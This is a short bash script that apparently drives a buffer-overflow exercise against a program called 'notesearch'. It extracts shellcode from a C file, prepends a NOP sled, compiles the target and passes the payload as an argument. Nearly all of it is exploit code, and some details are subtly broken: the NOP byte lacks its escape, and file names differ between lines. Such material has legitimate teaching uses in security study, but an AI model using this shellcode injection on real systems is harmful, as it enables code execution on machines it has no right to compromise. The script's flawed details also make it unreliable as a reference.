#!/bin/bash

TARGET_PROGRAM=notesearch

echo "About to prints a loop"

for i in $(head exploit_notsearch.c | grep "\"" | cut -d\" -f2); 
do
    echo -en $i
done > shellcode.bin

export SHELLCODE=$(perl -e 'print "x90"x200')$(cat shellcode.bin)

gcc -g -o $TARGET_PROGRAM notesearcher.c

./$TARGET_PROGRAM $SHELLCODE